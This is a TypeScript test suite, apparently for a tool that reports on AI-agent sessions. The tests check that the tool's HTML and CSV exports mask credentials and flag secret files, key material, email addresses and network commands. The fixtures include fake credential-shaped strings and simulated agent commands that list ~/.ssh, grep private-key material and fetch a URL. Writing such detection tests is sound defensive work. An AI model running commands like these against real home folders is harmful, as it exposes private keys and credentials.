    ledger: foldFiles(events),
    sessionId: `s-${AKID}`,
    title: null,
    version: `0.16.1+${PAT}`,
    now: Date.UTC(2026, 10, 10, 9, 12),
  });
  const html = reportHtml(masked, "en");
  // Booleans only: a failing assertion on the text would print the vector into the log.
  const holds = (value: string) => html.includes(value);
  const csv = reportCsv(masked, "en");

  it("the agent id", () => {
    expect(masked.findings.some((f) => f.agentId === `helper-${SLACK}`)).toBe(true);
    expect(holds(SLACK)).toBe(false);
    expect(html.includes("helper-[credential: slack-token]")).toBe(true);
  });

  it("the tool name", () => {
    expect(masked.findings.some((f) => f.tool === `mcp-${GOOGLE}`)).toBe(true);
    expect(holds(GOOGLE)).toBe(false);
    expect(html.includes("mcp-[credential: google-api-key]")).toBe(true);
  });

  it("the session id", () => {
    expect(holds(AKID)).toBe(false);
    expect(html.includes("s-[credential: aws-akid]")).toBe(true);
  });

  it("the agent id in the CSV", () => {
    expect(csv.includes(SLACK)).toBe(false);
    expect(csv.includes(",helper-[credential: slack-token],")).toBe(true);
  });

  it("the tool name in the CSV", () => {
    expect(csv.includes(GOOGLE)).toBe(false);
    expect(csv.includes(",mcp-[credential: google-api-key],")).toBe(true);
  });

  it("the version", () => {
    expect(holds(PAT)).toBe(false);
    expect(html.includes("0.16.1+[credential: github-pat]")).toBe(true);
  });
});

describe("verdictLine", () => {
  it("is the headline and the first sentence, in plain text", () => {
    const critical = build(busy().events);
    expect(verdictLine(critical, "en")).toBe(
      "Secrets appear in this session. Content from these findings went to claude-sonnet-4-5 (cloud).",
    );
    expect(verdictLine(critical, "de")).toBe(
      "In dieser Session kommen Geheimnisse vor. Inhalt aus diesen Befunden ging an claude-sonnet-4-5 (Cloud).",
    );
    expect(verdictLine(critical, "en")).not.toMatch(/[<>&]/);
  });

  it("names what was checked for a project-only session", () => {
    const project = build(new Rec().start().tool("read_file", { path: "README.md" }).events);
    expect(verdictLine(project, "en")).toBe(
      "The files the session touched lie in the project. This report checked for secret files by name, " +
        "credentials by shape, environment and keychain dumps, network commands, files outside the project, " +
        "personal data and scripts with unknown effect, and found none of these.",
    );
    expect(verdictLine(project, "de")).toMatch(
      /^Die Dateien, die die Session berührt hat, liegen im Projekt\. Dieser Bericht hat /,
    );
  });

  it("says when the workspace was not recorded", () => {
    const project = build(new Rec().start(null).tool("read_file", { path: "README.md" }).events);
    const en = verdictLine(project, "en");
    expect(en.startsWith("The workspace was not recorded. This report checked for ")).toBe(true);
    expect(en).toContain("system folders and dot folders of a home folder");
    expect(en).not.toContain("outside the project");
    const de = verdictLine(project, "de");
    expect(de.startsWith("Der Arbeitsordner wurde nicht aufgezeichnet. Dieser Bericht hat ")).toBe(true);
    expect(de).not.toContain("außerhalb des Projekts");
  });

  it("says when the destination was not recorded", () => {
    // No exchange and no run_start provider: the one destination row records nothing.
    const report = build(new Rec().start().tool("read_file", { path: ".env" }, "DEBUG=1\n").events);
    expect(report.destinations.map((d) => [d.provider, d.model])).toEqual([[null, null]]);
    expect(verdictLine(report, "en")).toBe(
      "Secrets appear in this session. Content from these findings went to a destination that was not recorded.",
    );
    expect(verdictLine(report, "de")).toBe(
      "In dieser Session kommen Geheimnisse vor. Inhalt aus diesen Befunden ging an ein Ziel, das nicht aufgezeichnet wurde.",
    );
  });
});

describe("the rule words", () => {
  it("names key-body as key material", () => {
    const line = ["MIIEowIBAAKCAQEAx9Ym4Qz7Rt2Lp8Wk", "Nb3Vc6Hs1Jd5Gf0AhkiG9w0BAQEFAASC"].join("");
    const report = build(new Rec().start().tool("Bash", { command: `grep -c ${line} k.pem` }).events);
    expect(reportHtml(report, "en")).toContain(
      '<span class="masked">credential 1</span> (key material, 33 to 64 bytes)',
    );
    expect(reportHtml(report, "de")).toContain(
      '<span class="masked">credential 1</span> (Schlüsselmaterial, 33 bis 64 Byte)',
    );
  });
});

describe("reportFilename", () => {
  const now = Date.UTC(2026, 10, 10, 9, 12);

  it("follows the export's slug and UTC stamp", () => {
    expect(reportFilename("html", "Fix the payment webhook!", now)).toBe(
      "spectroscope-files-report-fix-the-payment-webhook-20261110-0912.html",
    );
    expect(reportFilename("csv", "Fix the payment webhook!", now)).toBe(
      "spectroscope-files-report-fix-the-payment-webhook-20261110-0912.csv",
    );
    expect(reportFilename("csv", null, now)).toBe("spectroscope-files-report-20261110-0912.csv");
    expect(reportFilename("html", "!!!", now)).toBe("spectroscope-files-report-20261110-0912.html");
    expect(reportFilename("html", "x".repeat(80), now)).toBe(
      `spectroscope-files-report-${"x".repeat(48)}-20261110-0912.html`,
    );
  });

  it("masks a credential shape in the title before it becomes a name", () => {
    const akid = ["AK", "IA", "Z7Q3M2X9", "K4W8P1N6"].join("");
    // Call it with report.title; this pins the second mask for a raw title.
    // Booleans only, so a failure does not print the name into a log.
    const name = reportFilename("html", `deploy ${akid}`, now);
    expect(name.toLowerCase().includes(akid.toLowerCase())).toBe(false);
    expect(name === "spectroscope-files-report-deploy-credential-aws-akid-20261110-0912.html").toBe(true);
    // The masked title the report carries gives its label.
    expect(reportFilename("html", "deploy [credential 1: aws-akid]", now)).toBe(
      "spectroscope-files-report-deploy-credential-1-aws-akid-20261110-0912.html",
    );
  });
});

// Final fix wave item 3: the searches and listings section.
describe("searches and listings in the document", () => {
  const rec = new Rec()
    .start(W)
    .tool("Glob", { pattern: "**/*.pem", path: W }, "No files found")
    .tool("Bash", { command: "ls ~/.ssh" }, "id_ed25519\nconfig")
    .tool("read_file", { path: "src/a.ts" });
  const report = build(rec.events);

  it("stands after all files and before the limits, in both languages", () => {
    for (const [lang, heading, listed] of [
      ["en", "Searches and listings", "listed"],
      ["de", "Suchen und Auflistungen", "aufgelistet"],
    ] as const) {
      const html = reportHtml(report, lang);
      const files = html.indexOf('data-section="files"');
      const searches = html.indexOf('data-section="searches"');
      const limits = html.indexOf('data-section="limits"');
      expect(files < searches && searches < limits, lang).toBe(true);
      expect(html, lang).toContain(`<h2>${heading}</h2>`);
      const rows = html.match(/<tr data-search>[\s\S]*?<\/tr>/g) ?? [];
      expect(rows, lang).toHaveLength(2);
      expect(rows[0], lang).toContain('<td class="path">~/.ssh</td>');
      expect(rows[0], lang).toContain('<span class="lv lv-critical">');
      expect(rows[0], lang).toContain(`<td>${listed}</td>`);
      expect(rows[1], lang).toContain('<td class="path">**/*.pem</td>');
    }
  });

  it("is left out when the session made no search", () => {
    const html = reportHtml(build(new Rec().start(W).tool("read_file", { path: "a.ts" }).events), "en");
    expect(html).not.toContain('data-section="searches"');
  });
});

describe("the PowerShell limit", () => {
  it("is in the limits only when the session ran PowerShell", () => {
    const ps = build(new Rec().start(W).tool("powershell", { command: "iwr https://a.example.com" }).events);
    expect(reportHtml(ps, "en")).toContain("PowerShell is read for a few cmdlets only");
    expect(reportHtml(ps, "de")).toContain("PowerShell wird nur für wenige Cmdlets gelesen");
    const plain = build(new Rec().start(W).tool("Bash", { command: "ls" }).events);
    expect(reportHtml(plain, "en")).not.toContain("PowerShell");
  });
});

// Final fix wave items 6c and 6d.
describe("unrecorded destinations and the German words", () => {
  it("a finding's destination that records nothing reads as the verdict says it", () => {
    // A run without provider and model, and no exchange: one row that records nothing.
    const rec = new Rec().start(W).tool("read_file", { path: ".env" }, "A=1");
    const report = build(rec.events);
    for (const [lang, words] of [
      ["en", "a destination that was not recorded"],
      ["de", "ein Ziel, das nicht aufgezeichnet wurde"],
    ] as const) {
      const html = reportHtml(report, lang);
      expect(article(html, "secret-file"), lang).toContain(words);
      expect(article(html, "secret-file"), lang).not.toContain("(place not recorded)");
      expect(reportCsv(report, lang), lang).toContain(words);
    }
  });

  it("a destination with a host is named by its host, not as unrecorded", () => {
    const rec = new Rec()
      .start(W)
      .exchange({ provider: undefined, model: undefined, url: "http://10.0.0.5:1234/v1/chat" })
      .tool("read_file", { path: ".env" }, "A=1")
      .exchange({ provider: undefined, model: undefined, url: "http://10.0.0.5:1234/v1/chat" });
    const html = reportHtml(build(rec.events), "en");
    expect(verdictOf(html)).not.toContain("a destination that was not recorded");
    expect(article(html, "secret-file")).not.toContain("a destination that was not recorded");
  });

  it("the method line says no credential is printed, in the owner's German", () => {
    const html = reportHtml(build(busy().events), "de");
    expect(html).toContain(
      "Keine Zugangsdaten werden ausgegeben, auch nicht ihre genaue Länge oder ein Hash davon.",
    );
  });

  it("personal data is named as email-shaped strings", () => {
    const rec = new Rec().start(W).tool("Bash", { command: "git log -1" }, "Author: Ada <ada@example.org>");
    const report = build(rec.events);
    expect(article(reportHtml(report, "en"), "personal-data")).toContain("1 email-shaped string");
    expect(article(reportHtml(report, "de"), "personal-data")).toContain("1 E-Mail-förmige Zeichenkette");
  });
});
